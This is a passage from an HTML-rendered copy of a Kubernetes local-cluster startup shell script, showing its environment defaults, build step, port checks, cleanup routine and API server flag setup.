class="line">WAIT_FOR_URL_API_SERVER=$&#123;WAIT_FOR_URL_API_SERVER:-60&#125;</span><br><span class="line">ENABLE_DAEMON=$&#123;ENABLE_DAEMON:-false&#125;</span><br><span class="line">HOSTNAME_OVERRIDE=$&#123;HOSTNAME_OVERRIDE:-"127.0.0.1"&#125;</span><br><span class="line">EXTERNAL_CLOUD_PROVIDER=$&#123;EXTERNAL_CLOUD_PROVIDER:-false&#125;</span><br><span class="line">EXTERNAL_CLOUD_PROVIDER_BINARY=$&#123;EXTERNAL_CLOUD_PROVIDER_BINARY:-""&#125;</span><br><span class="line">CLOUD_PROVIDER=$&#123;CLOUD_PROVIDER:-""&#125;</span><br><span class="line">CLOUD_CONFIG=$&#123;CLOUD_CONFIG:-""&#125;</span><br><span class="line">FEATURE_GATES=$&#123;FEATURE_GATES:-"AllAlpha=false"&#125;</span><br><span class="line">STORAGE_BACKEND=$&#123;STORAGE_BACKEND:-"etcd3"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> swagger ui</span></span><br><span class="line">ENABLE_SWAGGER_UI=$&#123;ENABLE_SWAGGER_UI:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> Pod priority and preemption</span></span><br><span class="line">ENABLE_POD_PRIORITY_PREEMPTION=$&#123;ENABLE_POD_PRIORITY_PREEMPTION:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> kubernetes dashboard</span></span><br><span class="line">ENABLE_CLUSTER_DASHBOARD=$&#123;KUBE_ENABLE_CLUSTER_DASHBOARD:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">enable</span> audit <span class="built_in">log</span></span></span><br><span class="line">ENABLE_APISERVER_BASIC_AUDIT=$&#123;ENABLE_APISERVER_BASIC_AUDIT:-false&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> RBAC Mode options</span></span><br><span class="line">AUTHORIZATION_MODE=$&#123;AUTHORIZATION_MODE:-"Node,RBAC"&#125;</span><br><span class="line">KUBECONFIG_TOKEN=$&#123;KUBECONFIG_TOKEN:-""&#125;</span><br><span class="line">AUTH_ARGS=$&#123;AUTH_ARGS:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Install a default storage class (enabled by default)</span></span><br><span class="line">DEFAULT_STORAGE_CLASS=$&#123;KUBE_DEFAULT_STORAGE_CLASS:-true&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> start the cache mutation detector by default so that cache mutators will be found</span></span><br><span class="line">KUBE_CACHE_MUTATION_DETECTOR="$&#123;KUBE_CACHE_MUTATION_DETECTOR:-true&#125;"</span><br><span class="line">export KUBE_CACHE_MUTATION_DETECTOR</span><br><span class="line"><span class="meta">#</span><span class="bash"> panic the server on watch decode errors since they are considered coder mistakes</span></span><br><span class="line">KUBE_PANIC_WATCH_DECODE_ERROR="$&#123;KUBE_PANIC_WATCH_DECODE_ERROR:-true&#125;"</span><br><span class="line">export KUBE_PANIC_WATCH_DECODE_ERROR</span><br><span class="line">ENABLE_ADMISSION_PLUGINS=$&#123;ENABLE_ADMISSION_PLUGINS:-""&#125;</span><br><span class="line">DISABLE_ADMISSION_PLUGINS=$&#123;DISABLE_ADMISSION_PLUGINS:-""&#125;</span><br><span class="line">ADMISSION_CONTROL_CONFIG_FILE=$&#123;ADMISSION_CONTROL_CONFIG_FILE:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> START_MODE can be <span class="string">'all'</span>, <span class="string">'kubeletonly'</span>, or <span class="string">'nokubelet'</span></span></span><br><span class="line">START_MODE=$&#123;START_MODE:-"all"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> A list of controllers to <span class="built_in">enable</span></span></span><br><span class="line">KUBE_CONTROLLERS="$&#123;KUBE_CONTROLLERS:-"*"&#125;"</span><br><span class="line"><span class="meta">#</span><span class="bash"> sanity check <span class="keyword">for</span> OpenStack provider</span></span><br><span class="line">if [ "$&#123;CLOUD_PROVIDER&#125;" == "openstack" ]; then</span><br><span class="line">    if [ "$&#123;CLOUD_CONFIG&#125;" == "" ]; then</span><br><span class="line">        echo "Missing CLOUD_CONFIG env for OpenStack provider!"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">    if [ ! -f "$&#123;CLOUD_CONFIG&#125;" ]; then</span><br><span class="line">        echo "Cloud config $&#123;CLOUD_CONFIG&#125; doesn't exist"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> feature gates <span class="keyword">if</span> using ipvs mode</span></span><br><span class="line">if [ "$&#123;KUBE_PROXY_MODE&#125;" == "ipvs" ]; then</span><br><span class="line">    # If required kernel modules are not available, fall back to iptables.</span><br><span class="line">    sudo modprobe -a ip_vs ip_vs_rr ip_vs_wrr ip_vs_sh nf_conntrack_ipv4</span><br><span class="line">    if [[ $? -eq 0 ]]; then</span><br><span class="line">      FEATURE_GATES="$&#123;FEATURE_GATES&#125;,SupportIPVSProxyMode=true"</span><br><span class="line">    else</span><br><span class="line">      echo "Required kernel modules for ipvs not found. Falling back to iptables mode."</span><br><span class="line">      KUBE_PROXY_MODE=iptables</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> feature gates <span class="keyword">if</span> <span class="built_in">enable</span> Pod priority and preemption</span></span><br><span class="line">if [ "$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;" == true ]; then</span><br><span class="line">    FEATURE_GATES="$FEATURE_GATES,PodPriority=true"</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> warn <span class="keyword">if</span> users are running with swap allowed</span></span><br><span class="line">if [ "$&#123;FAIL_SWAP_ON&#125;" == "false" ]; then</span><br><span class="line">    echo "WARNING : The kubelet is configured to not fail if swap is enabled; production deployments should disable swap."</span><br><span class="line">fi</span><br><span class="line">if [ "$(id -u)" != "0" ]; then</span><br><span class="line">    echo "WARNING : This script MAY be run as root for docker socket / iptables functionality; if failures occur, retry as root." 2&gt;&amp;1</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Stop right away <span class="keyword">if</span> the build fails</span></span><br><span class="line">set -e</span><br><span class="line">source "$&#123;KUBE_ROOT&#125;/hack/lib/init.sh"</span><br><span class="line">function usage &#123;</span><br><span class="line">            echo "This script starts a local kube cluster. "</span><br><span class="line">            echo "Example 0: hack/local-up-cluster.sh -h  (this 'help' usage description)"</span><br><span class="line">            echo "Example 1: hack/local-up-cluster.sh -o _output/dockerized/bin/linux/amd64/ (run from docker output)"</span><br><span class="line">            echo "Example 2: hack/local-up-cluster.sh -O (auto-guess the bin path for your platform)"</span><br><span class="line">            echo "Example 3: hack/local-up-cluster.sh (build a local copy of the source)"</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This <span class="keyword">function</span> guesses <span class="built_in">where</span> the existing cached binary build is <span class="keyword">for</span> the `-O`</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> flag</span></span><br><span class="line">function guess_built_binary_path &#123;</span><br><span class="line"><span class="meta">  #</span><span class="bash"><span class="built_in">local</span> hyperkube_path=$(kube::util::find-binary <span class="string">"hyperkube"</span>)</span></span><br><span class="line">  local hyperkube_path=$(kube::util::find-binary "kube-apiserver")</span><br><span class="line">  if [[ -z "$&#123;hyperkube_path&#125;" ]]; then</span><br><span class="line">    return</span><br><span class="line">  fi</span><br><span class="line">  echo -n "$(dirname "$&#123;hyperkube_path&#125;")"</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Allow user to supply the source directory.</span></span></span><br><span class="line">GO_OUT=$&#123;GO_OUT:-&#125;</span><br><span class="line">while getopts "ho:O" OPTION</span><br><span class="line">do</span><br><span class="line">    case $OPTION in</span><br><span class="line">        o)</span><br><span class="line">            echo "skipping build"</span><br><span class="line">            GO_OUT="$OPTARG"</span><br><span class="line">            echo "using source $GO_OUT"</span><br><span class="line">            ;;</span><br><span class="line">        O)</span><br><span class="line">            GO_OUT=$(guess_built_binary_path)</span><br><span class="line">            if [ "$GO_OUT" == "" ]; then</span><br><span class="line">                echo "Could not guess the correct output directory to use."</span><br><span class="line">                exit 1</span><br><span class="line">            fi</span><br><span class="line">            ;;</span><br><span class="line">        h)</span><br><span class="line">            usage</span><br><span class="line">            exit</span><br><span class="line">            ;;</span><br><span class="line">        ?)</span><br><span class="line">            usage</span><br><span class="line">            exit</span><br><span class="line">            ;;</span><br><span class="line">    esac</span><br><span class="line">done</span><br><span class="line">if [ "x$GO_OUT" == "x" ]; then</span><br><span class="line">    #make -C "$&#123;KUBE_ROOT&#125;" WHAT="cmd/kubectl cmd/hyperkube"</span><br><span class="line">    make -C "$&#123;KUBE_ROOT&#125;" GOGCFLAGS="-N -l" WHAT="cmd/kubectl cmd/kube-proxy cmd/kube-apiserver cmd/kube-controller-manager cmd/cloud-controller-manager cmd/kube-scheduler cmd/kubelet"</span><br><span class="line">else</span><br><span class="line">    echo "skipped the build."</span><br><span class="line">fi</span><br><span class="line">function test_rkt &#123;</span><br><span class="line">    if [[ -n "$&#123;RKT_PATH&#125;" ]]; then</span><br><span class="line">      $&#123;RKT_PATH&#125; list 2&gt; /dev/null 1&gt; /dev/null</span><br><span class="line">      if [ "$?" != "0" ]; then</span><br><span class="line">        echo "Failed to successfully run 'rkt list', please verify that $&#123;RKT_PATH&#125; is the path of rkt binary."</span><br><span class="line">        exit 1</span><br><span class="line">      fi</span><br><span class="line">    else</span><br><span class="line">      rkt list 2&gt; /dev/null 1&gt; /dev/null</span><br><span class="line">      if [ "$?" != "0" ]; then</span><br><span class="line">        echo "Failed to successfully run 'rkt list', please verify that rkt is in \$PATH."</span><br><span class="line">        exit 1</span><br><span class="line">      fi</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Shut down anyway <span class="keyword">if</span> there<span class="string">'s an error.</span></span></span><br><span class="line">set +e</span><br><span class="line">API_PORT=$&#123;API_PORT:-8080&#125;</span><br><span class="line">API_SECURE_PORT=$&#123;API_SECURE_PORT:-6443&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> WARNING: For DNS to work on most setups you should <span class="built_in">export</span> API_HOST as the docker0 ip address,</span></span><br><span class="line">API_HOST=$&#123;API_HOST:-localhost&#125;</span><br><span class="line">API_HOST_IP=$&#123;API_HOST_IP:-"127.0.0.1"&#125;</span><br><span class="line">ADVERTISE_ADDRESS=$&#123;ADVERTISE_ADDRESS:-""&#125;</span><br><span class="line">API_BIND_ADDR=$&#123;API_BIND_ADDR:-"0.0.0.0"&#125;</span><br><span class="line">EXTERNAL_HOSTNAME=$&#123;EXTERNAL_HOSTNAME:-localhost&#125;</span><br><span class="line">KUBELET_HOST=$&#123;KUBELET_HOST:-"127.0.0.1"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> By default only allow CORS <span class="keyword">for</span> requests on localhost</span></span><br><span class="line">API_CORS_ALLOWED_ORIGINS=$&#123;API_CORS_ALLOWED_ORIGINS:-/127.0.0.1(:[0-9]+)?$,/localhost(:[0-9]+)?$&#125;</span><br><span class="line">KUBELET_PORT=$&#123;KUBELET_PORT:-10250&#125;</span><br><span class="line">LOG_LEVEL=$&#123;LOG_LEVEL:-3&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Use to increase verbosity on particular files, e.g. LOG_SPEC=token_controller*=5,other_controller*=4</span></span><br><span class="line">LOG_SPEC=$&#123;LOG_SPEC:-""&#125;</span><br><span class="line">LOG_DIR=$&#123;LOG_DIR:-"/tmp"&#125;</span><br><span class="line">CONTAINER_RUNTIME=$&#123;CONTAINER_RUNTIME:-"docker"&#125;</span><br><span class="line">CONTAINER_RUNTIME_ENDPOINT=$&#123;CONTAINER_RUNTIME_ENDPOINT:-""&#125;</span><br><span class="line">IMAGE_SERVICE_ENDPOINT=$&#123;IMAGE_SERVICE_ENDPOINT:-""&#125;</span><br><span class="line">RKT_PATH=$&#123;RKT_PATH:-""&#125;</span><br><span class="line">RKT_STAGE1_IMAGE=$&#123;RKT_STAGE1_IMAGE:-""&#125;</span><br><span class="line">CHAOS_CHANCE=$&#123;CHAOS_CHANCE:-0.0&#125;</span><br><span class="line">CPU_CFS_QUOTA=$&#123;CPU_CFS_QUOTA:-true&#125;</span><br><span class="line">ENABLE_HOSTPATH_PROVISIONER=$&#123;ENABLE_HOSTPATH_PROVISIONER:-"false"&#125;</span><br><span class="line">CLAIM_BINDER_SYNC_PERIOD=$&#123;CLAIM_BINDER_SYNC_PERIOD:-"15s"&#125; # current k8s default</span><br><span class="line">ENABLE_CONTROLLER_ATTACH_DETACH=$&#123;ENABLE_CONTROLLER_ATTACH_DETACH:-"true"&#125; # current default</span><br><span class="line">KEEP_TERMINATED_POD_VOLUMES=$&#123;KEEP_TERMINATED_POD_VOLUMES:-"true"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the default dir and filename <span class="built_in">where</span> the apiserver will generate a self-signed cert</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">which</span> should be able to be used as the CA to verify itself</span></span><br><span class="line">CERT_DIR=$&#123;CERT_DIR:-"/var/run/kubernetes"&#125;</span><br><span class="line">ROOT_CA_FILE=$&#123;CERT_DIR&#125;/server-ca.crt</span><br><span class="line">ROOT_CA_KEY=$&#123;CERT_DIR&#125;/server-ca.key</span><br><span class="line">CLUSTER_SIGNING_CERT_FILE=$&#123;CLUSTER_SIGNING_CERT_FILE:-"$&#123;ROOT_CA_FILE&#125;"&#125;</span><br><span class="line">CLUSTER_SIGNING_KEY_FILE=$&#123;CLUSTER_SIGNING_KEY_FILE:-"$&#123;ROOT_CA_KEY&#125;"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> name of the cgroup driver, i.e. cgroupfs or systemd</span></span><br><span class="line">if [[ $&#123;CONTAINER_RUNTIME&#125; == "docker" ]]; then</span><br><span class="line"><span class="meta">  #</span><span class="bash"> default cgroup driver to match what is reported by docker to simplify <span class="built_in">local</span> development</span></span><br><span class="line">  if [[ -z $&#123;CGROUP_DRIVER&#125; ]]; then</span><br><span class="line">    # match driver with docker runtime reported value (they must match)</span><br><span class="line">    CGROUP_DRIVER=$(docker info | grep "Cgroup Driver:" | cut -f3- -d' ')</span><br><span class="line">    echo "Kubelet cgroup driver defaulted to use: $&#123;CGROUP_DRIVER&#125;"</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> Ensure CERT_DIR is created <span class="keyword">for</span> auto-generated crt/key and kubeconfig</span></span><br><span class="line">mkdir -p "$&#123;CERT_DIR&#125;" &amp;&gt;/dev/null || sudo mkdir -p "$&#123;CERT_DIR&#125;"</span><br><span class="line">CONTROLPLANE_SUDO=$(test -w "$&#123;CERT_DIR&#125;" || echo "sudo -E")</span><br><span class="line">function test_apiserver_off &#123;</span><br><span class="line">    # For the common local scenario, fail fast if server is already running.</span><br><span class="line">    # this can happen if you run local-up-cluster.sh twice and kill etcd in between.</span><br><span class="line">    if [[ "$&#123;API_PORT&#125;" -gt "0" ]]; then</span><br><span class="line">        curl --silent -g $API_HOST:$API_PORT</span><br><span class="line">        if [ ! $? -eq 0 ]; then</span><br><span class="line">            echo "API SERVER insecure port is free, proceeding..."</span><br><span class="line">        else</span><br><span class="line">            echo "ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_PORT"</span><br><span class="line">            exit 1</span><br><span class="line">        fi</span><br><span class="line">    fi</span><br><span class="line">    curl --silent -k -g $API_HOST:$API_SECURE_PORT</span><br><span class="line">    if [ ! $? -eq 0 ]; then</span><br><span class="line">        echo "API SERVER secure port is free, proceeding..."</span><br><span class="line">    else</span><br><span class="line">        echo "ERROR starting API SERVER, exiting. Some process on $API_HOST is serving already on $API_SECURE_PORT"</span><br><span class="line">        exit 1</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function detect_binary &#123;</span><br><span class="line">    # Detect the OS name/arch so that we can find our binary</span><br><span class="line">    case "$(uname -s)" in</span><br><span class="line">      Darwin)</span><br><span class="line">        host_os=darwin</span><br><span class="line">        ;;</span><br><span class="line">      Linux)</span><br><span class="line">        host_os=linux</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        echo "Unsupported host OS.  Must be Linux or Mac OS X." &gt;&amp;2</span><br><span class="line">        exit 1</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">    case "$(uname -m)" in</span><br><span class="line">      x86_64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      i?86_64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      amd64*)</span><br><span class="line">        host_arch=amd64</span><br><span class="line">        ;;</span><br><span class="line">      aarch64*)</span><br><span class="line">        host_arch=arm64</span><br><span class="line">        ;;</span><br><span class="line">      arm64*)</span><br><span class="line">        host_arch=arm64</span><br><span class="line">        ;;</span><br><span class="line">      arm*)</span><br><span class="line">        host_arch=arm</span><br><span class="line">        ;;</span><br><span class="line">      i?86*)</span><br><span class="line">        host_arch=x86</span><br><span class="line">        ;;</span><br><span class="line">      s390x*)</span><br><span class="line">        host_arch=s390x</span><br><span class="line">        ;;</span><br><span class="line">      ppc64le*)</span><br><span class="line">        host_arch=ppc64le</span><br><span class="line">        ;;</span><br><span class="line">      *)</span><br><span class="line">        echo "Unsupported host arch. Must be x86_64, 386, arm, arm64, s390x or ppc64le." &gt;&amp;2</span><br><span class="line">        exit 1</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">   GO_OUT="$&#123;KUBE_ROOT&#125;/_output/local/bin/$&#123;host_os&#125;/$&#123;host_arch&#125;"</span><br><span class="line">&#125;</span><br><span class="line">cleanup_dockerized_kubelet()</span><br><span class="line">&#123;</span><br><span class="line">  if [[ -e $KUBELET_CIDFILE ]]; then</span><br><span class="line">    docker kill $(&lt;$KUBELET_CIDFILE) &gt; /dev/null</span><br><span class="line">    rm -f $KUBELET_CIDFILE</span><br><span class="line">  fi</span><br><span class="line">&#125;</span><br><span class="line">cleanup()</span><br><span class="line">&#123;</span><br><span class="line">  echo "Cleaning up..."</span><br><span class="line"><span class="meta">  #</span><span class="bash"> delete running images</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">if</span> [[ <span class="string">"<span class="variable">$&#123;ENABLE_CLUSTER_DNS&#125;</span>"</span> == <span class="literal">true</span> ]]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Still need to figure why this commands throw an error: Error from server: client: etcd cluster is unavailable or misconfigured</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">     <span class="variable">$&#123;KUBECTL&#125;</span> --namespace=kube-system delete service kube-dns</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> And this one hang forever:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">     <span class="variable">$&#123;KUBECTL&#125;</span> --namespace=kube-system delete rc kube-dns-v10</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">fi</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the API server is still running</span></span><br><span class="line">  [[ -n "$&#123;APISERVER_PID-&#125;" ]] &amp;&amp; APISERVER_PIDS=$(pgrep -P $&#123;APISERVER_PID&#125; ; ps -o pid= -p $&#123;APISERVER_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;APISERVER_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;APISERVER_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the controller-manager is still running</span></span><br><span class="line">  [[ -n "$&#123;CTLRMGR_PID-&#125;" ]] &amp;&amp; CTLRMGR_PIDS=$(pgrep -P $&#123;CTLRMGR_PID&#125; ; ps -o pid= -p $&#123;CTLRMGR_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;CTLRMGR_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;CTLRMGR_PIDS&#125;</span><br><span class="line">  if [[ -n "$DOCKERIZE_KUBELET" ]]; then</span><br><span class="line">    cleanup_dockerized_kubelet</span><br><span class="line">  else</span><br><span class="line">    # Check if the kubelet is still running</span><br><span class="line">    [[ -n "$&#123;KUBELET_PID-&#125;" ]] &amp;&amp; KUBELET_PIDS=$(pgrep -P $&#123;KUBELET_PID&#125; ; ps -o pid= -p $&#123;KUBELET_PID&#125;)</span><br><span class="line">    [[ -n "$&#123;KUBELET_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;KUBELET_PIDS&#125;</span><br><span class="line">  fi</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the proxy is still running</span></span><br><span class="line">  [[ -n "$&#123;PROXY_PID-&#125;" ]] &amp;&amp; PROXY_PIDS=$(pgrep -P $&#123;PROXY_PID&#125; ; ps -o pid= -p $&#123;PROXY_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;PROXY_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;PROXY_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the scheduler is still running</span></span><br><span class="line">  [[ -n "$&#123;SCHEDULER_PID-&#125;" ]] &amp;&amp; SCHEDULER_PIDS=$(pgrep -P $&#123;SCHEDULER_PID&#125; ; ps -o pid= -p $&#123;SCHEDULER_PID&#125;)</span><br><span class="line">  [[ -n "$&#123;SCHEDULER_PIDS-&#125;" ]] &amp;&amp; sudo kill $&#123;SCHEDULER_PIDS&#125;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Check <span class="keyword">if</span> the etcd is still running</span></span><br><span class="line">  [[ -n "$&#123;ETCD_PID-&#125;" ]] &amp;&amp; kube::etcd::stop</span><br><span class="line">  [[ -n "$&#123;ETCD_DIR-&#125;" ]] &amp;&amp; kube::etcd::clean_etcd_dir</span><br><span class="line">  exit 0</span><br><span class="line">&#125;</span><br><span class="line">function warning &#123;</span><br><span class="line">  message=$1</span><br><span class="line">  echo $(tput bold)$(tput setaf 1)</span><br><span class="line">  echo "WARNING: $&#123;message&#125;"</span><br><span class="line">  echo $(tput sgr0)</span><br><span class="line">&#125;</span><br><span class="line">function start_etcd &#123;</span><br><span class="line">    echo "Starting etcd"</span><br><span class="line">    kube::etcd::start</span><br><span class="line">&#125;</span><br><span class="line">function set_service_accounts &#123;</span><br><span class="line">    SERVICE_ACCOUNT_LOOKUP=$&#123;SERVICE_ACCOUNT_LOOKUP:-true&#125;</span><br><span class="line">    SERVICE_ACCOUNT_KEY=$&#123;SERVICE_ACCOUNT_KEY:-/tmp/kube-serviceaccount.key&#125;</span><br><span class="line">    # Generate ServiceAccount key if needed</span><br><span class="line">    if [[ ! -f "$&#123;SERVICE_ACCOUNT_KEY&#125;" ]]; then</span><br><span class="line">      mkdir -p "$(dirname $&#123;SERVICE_ACCOUNT_KEY&#125;)"</span><br><span class="line">      openssl genrsa -out "$&#123;SERVICE_ACCOUNT_KEY&#125;" 2048 2&gt;/dev/null</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line">function start_apiserver &#123;</span><br><span class="line">    security_admission=""</span><br><span class="line">    if [[ -n "$&#123;DENY_SECURITY_CONTEXT_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",SecurityContextDeny"</span><br><span class="line">    fi</span><br><span class="line">    if [[ -n "$&#123;PSP_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",PodSecurityPolicy"</span><br><span class="line">    fi</span><br><span class="line">    if [[ -n "$&#123;NODE_ADMISSION&#125;" ]]; then</span><br><span class="line">      security_admission=",NodeRestriction"</span><br><span class="line">    fi</span><br><span class="line">    if [ "$&#123;ENABLE_POD_PRIORITY_PREEMPTION&#125;" == true ]; then</span><br><span class="line">      security_admission=",Priority"</span><br><span class="line">      if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">          RUNTIME_CONFIG+=","</span><br><span class="line">      fi</span><br><span class="line">      RUNTIME_CONFIG+="scheduling.k8s.io/v1alpha1=true"</span><br><span class="line">    fi</span><br><span class="line">    # Admission Controllers to invoke prior to persisting objects in cluster</span><br><span class="line">    #</span><br><span class="line">    # The order defined here dose not matter.</span><br><span class="line">    ENABLE_ADMISSION_PLUGINS=LimitRanger,ServiceAccount$&#123;security_admission&#125;,DefaultStorageClass,DefaultTolerationSeconds,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota,PodPreset,StorageObjectInUseProtection</span><br><span class="line">    audit_arg=""</span><br><span class="line">    APISERVER_BASIC_AUDIT_LOG=""</span><br><span class="line">    if [[ "$&#123;ENABLE_APISERVER_BASIC_AUDIT:-&#125;" = true ]]; then</span><br><span class="line">        # We currently only support enabling with a fixed path and with built-in log</span><br><span class="line">        # rotation "disabled" (large value) so it behaves like kube-apiserver.log.</span><br><span class="line">        # External log rotation should be set up the same as for kube-apiserver.log.</span><br><span class="line">        APISERVER_BASIC_AUDIT_LOG=/tmp/kube-apiserver-audit.log</span><br><span class="line">        audit_arg=" --audit-log-path=$&#123;APISERVER_BASIC_AUDIT_LOG&#125;"</span><br><span class="line">        audit_arg+=" --audit-log-maxage=0"</span><br><span class="line">        audit_arg+=" --audit-log-maxbackup=0"</span><br><span class="line">        # Lumberjack doesn't offer any way to disable size-based rotation. It also</span><br><span class="line">        # has an in-memory counter that doesn't notice if you truncate the file.</span><br><span class="line">        # 2000000000 (in MiB) is a large number that fits in 31 bits. If the log</span><br><span class="line">        # grows at 10MiB/s (~30K QPS), it will rotate after ~6 years if apiserver</span><br><span class="line">        # never restarts. Please manually restart apiserver before this time.</span><br><span class="line">        audit_arg+=" --audit-log-maxsize=2000000000"</span><br><span class="line">    fi</span><br><span class="line">    swagger_arg=""</span><br><span class="line">    if [[ "$&#123;ENABLE_SWAGGER_UI&#125;" = true ]]; then</span><br><span class="line">      swagger_arg="--enable-swagger-ui=true "</span><br><span class="line">    fi</span><br><span class="line">    authorizer_arg=""</span><br><span class="line">    if [[ -n "$&#123;AUTHORIZATION_MODE&#125;" ]]; then</span><br><span class="line">      authorizer_arg="--authorization-mode=$&#123;AUTHORIZATION_MODE&#125; "</span><br><span class="line">    fi</span><br><span class="line">    priv_arg=""</span><br><span class="line">    if [[ -n "$&#123;ALLOW_PRIVILEGED&#125;" ]]; then</span><br><span class="line">      priv_arg="--allow-privileged "</span><br><span class="line">    fi</span><br><span class="line">    if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *"Initializers"* ]]; then</span><br><span class="line">        if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">          RUNTIME_CONFIG+=","</span><br><span class="line">        fi</span><br><span class="line">        RUNTIME_CONFIG+="admissionregistration.k8s.io/v1alpha1"</span><br><span class="line">    fi</span><br><span class="line">    if [[ $&#123;ENABLE_ADMISSION_PLUGINS&#125; == *"PodPreset"* ]]; then</span><br><span class="line">        if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">            RUNTIME_CONFIG+=","</span><br><span class="line">        fi</span><br><span class="line">        RUNTIME_CONFIG+="settings.k8s.io/v1alpha1"</span><br><span class="line">    fi</span><br><span class="line">    runtime_config=""</span><br><span class="line">    if [[ -n "$&#123;RUNTIME_CONFIG&#125;" ]]; then</span><br><span class="line">      runtime_config="--runtime-config=$&#123;RUNTIME_CONFIG&#125;"</span><br><span class="line">    fi</span><br><span class="line">    # Let the API server pick a default address when API_HOST_IP</span><br><span class="line">    # is set to 127.0.0.1</span><br><span class="line">    advertise_address=""</span><br><span class="line">    if [[ "$&#123;API_HOST_IP&#125;" != "127.0.0.1" ]]; then</span><br><span class="line">        advertise_address="--advertise-address=$&#123;API_HOST_IP&#125;"</span><br><span class="line">    fi</span><br><span class="line">    if [[ "$&#123;ADVERTISE_ADDRESS&#125;" != "" ]] ; then</span><br><span class="line">        advertise_address="--advertise-address=$&#123;ADVERTISE_ADDRESS&#125;"</span><br><span class="line">    fi</span><br><span class="line">    # Create CA signers</span><br><span class="line">    if [[ "$&#123;ENABLE_SINGLE_CA_SIGNER:-&#125;" = true ]]; then</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" server '"client auth","server auth"'</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca.key" "$&#123;CERT_DIR&#125;/client-ca.key"</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca.crt" "$&#123;CERT_DIR&#125;/client-ca.crt"</span><br><span class="line">        sudo cp "$&#123;CERT_DIR&#125;/server-ca-config.json" "$&#123;CERT_DIR&#125;/client-ca-config.json"</span><br><span class="line">    else</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" server '"server auth"'</span><br><span class="line">        kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" client '"client auth"'</span><br><span class="line">    fi</span><br><span class="line">    # Create auth proxy client ca</span><br><span class="line">    kube::util::create_signing_certkey "$&#123;CONTROLPLANE_SUDO&#125;" "$&#123;CERT_DIR&#125;" request-header '"client auth"'</span><br><span class="line">    # serving cert for kube-apiserver</span><br><span class="line">    kube::util::create_serving_certkey "$&#123;CONTROLPLANE_SUDO&#125;" 